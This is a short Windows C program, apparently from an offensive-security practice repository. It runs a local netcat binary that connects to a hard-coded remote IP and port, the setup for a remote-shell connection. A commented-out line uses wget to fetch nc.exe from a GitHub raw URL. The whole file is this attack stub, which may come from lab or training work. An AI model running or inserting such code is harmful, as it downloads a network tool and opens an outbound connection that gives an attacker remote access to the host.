#include <stdlib.h>
#include <windows.h>

int main ()
{

    int i;
    // https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe
    // i = system ("wget https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe -o \%C\%\\nc.exe");
    // Sleep(2000); // 10 seconds (10000 milliseconds)
    i = system ("C:\\Users\\joshm\\Desktop\\ccso-offense\\dll\\nc.exe 10.118.53.64 9090");

    return 0;
}
